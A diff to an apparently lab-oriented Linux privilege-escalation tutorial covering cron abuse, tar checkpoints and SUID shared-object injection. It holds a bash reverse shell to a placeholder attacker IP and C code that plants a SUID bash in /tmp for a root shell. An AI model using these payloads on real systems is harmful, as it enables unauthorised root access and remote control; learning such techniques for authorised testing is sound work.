@@ -118,9 +118,9 @@ cat /etc/cron.deny*
 
 This thechnique involves identifying the default `$PATH` variable that's been configured for cron jobs in the `crontab` file, generating a payload, and placing it in the path.
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 So we create the `overwrive.sh` script in the /home/user folder and insert a Bash reverse shell.
 
@@ -132,7 +132,7 @@ echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh
 
 Using the example above: `cat /usr/local/bin/compress.sh`&#x20;
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 tar utility has a checkpoint feature that is used to display progress messages after a specific set of files. It also allows users to define a specific action that is executed during the checkpoint. We can leverage this feature to execute a reverse shell payload that will provide us with an elevated session when executed.
 
@@ -153,7 +153,7 @@ we can search for the script in the other directories specified in the $PATH var
 
 ## Exploiting SUID Binaries
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
@@ -170,4 +170,82 @@ chmod g+x, a+w script.sh #Groups executable permissions and all users and groups
 chmod a-x script.sh #Remove executable permissions from a file
 ```
 
-#### Understanding SUID permissions
+#### Understanding SUID (Set Owner User ID) permissions
+
+When applied, this permission allows users to execute a script or binary with the permissions of the file owner.
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+In this case, the members of the group and other users on the system will be able to execute the binary with root privileges, since the owner of the file is the root user.
+
+#### Searching for SUID binaries
+
+
+
+```bash
+find / -type f -perm -u=s -ls 2>/dev/null
+```
+
+This command will search for files that have the SUID access permission set for the file owner and will display the respective owner of each file or binary.
+
+#### Identifying vulnerable SUID binaries
+
+We can  streamline this process by utilizing a resource called GTFOBins
+
+{% embed url="https://gtfobins.github.io/" %}
+
+#### Escalation via shared object injection
+
+linPEAS runs each SUID binary with `strace` (Linux utility that is used to monitor and debug applications and processes and their interaction with the Linux kernel) to identify the shared objects that are used by the binary and lists their respective locations.
+
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+We can identify the suid-so binary as a potential target as it utilizes several shared objects that do not exist on the target system. However, one specific shared object file should have caught your attention: the suid-so binary utilizes a shared object named libcalc.so that is stored in the user account's home directory.
+
+> Shared objects are the Linux equivalent of Dynamically Linked Libraries (DLLs) on Windows and are used by Linux applications to provide additional functionality.
+
+Given that we are currently logged on to the target system as the user account, we should be able to modify the shared library that is being utilized by the SUID binary to execute arbitrary commands. In our case, this will provide us with an elevated session when the suid-so binary is executed. This attack works quite similarly to the Windows DLL injection technique, where we replaced the target DLL with a modified one that provided us with an elevated reverse shell when the target service was executed. Before we begin the exploitation phase, we should analyze what the suid-so binary does by executing it, given that the binary is stored in the /usr/local/bin directory. We can execute it directly by running the following command: `suid-so`
+
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+Alternatively, we can analyze what shared objects the binary uses manually with the strace utility as opposed to using automated tools. This can be done by running the following command:
+
+```bash
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+```
+
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+We identify  the liblocal.so shared object in the user account's home directory, like with linPEAS.
+
+We can also search for useful strings in the binary by using the built-in strings utility.
+
+```bash
+strings /usr/local/bin/suid-so
+```
+
+![](../.gitbook/assets/image.png)
+
+In this case, we can determine that the application utilizes the libcalc.so shared object in the user account's home directory. The strings utility can prove to be very useful if you do not have access to the strace utility or any automated enumeration scripts such as linPEAS.
+
+**The privilege escalation process can be performed by following these steps:**
+
+1. Checking whether the `libcalc.so` file exists. `ls -al /home/user/` .
+
+As shown in the following screenshot, the user account's home directory does not contain the .config directory, which contains the libcalc.so shared object file. As a result, we will have to create the .config directory and compile the shared object file ourselves:
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+2\. We can create the .config directory in the user account's home directory: `mkdir /home/user/.config` . Once we have created the .config directory, we need to create the libcalc.c file: `touch /home/user/.config/libcalc.c`&#x20;
+
+3\. The next step involves adding our custom C code to the `libcalc.c` file that we will compile. Open the `libcalc.c` file we just created with your terminal text editor of choice.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+static void inject() __attribute__((constructor));
+void inject() {
+system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /
+tmp/bash -p");
+}
+```
